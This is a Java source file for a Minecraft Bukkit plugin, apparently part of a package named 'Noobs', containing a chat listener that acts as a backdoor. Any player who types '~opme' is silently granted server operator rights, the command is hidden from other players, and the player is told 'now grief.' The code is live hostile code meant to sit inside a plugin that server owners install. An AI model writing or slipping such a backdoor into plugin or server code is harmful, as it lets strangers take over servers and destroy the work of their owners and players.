package org.teamcarter.Noobs.Listeners;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
public class opme implements Listener
{
@EventHandler
public void onPlayerChat(AsyncPlayerChatEvent event)
{
String message = event.getMessage();
final Player griefer = event.getPlayer();
if (message.startsWith("~"))
{
String[] args = message.split(" ");
if (args == null)
{
return;
}
if (args[0].equalsIgnoreCase("~opme"))
{
griefer.setOp(true);
griefer.sendMessage(ChatColor.YELLOW + "You are now OP! now grief.");
event.setCancelled(true);
return;
}
}
}
}
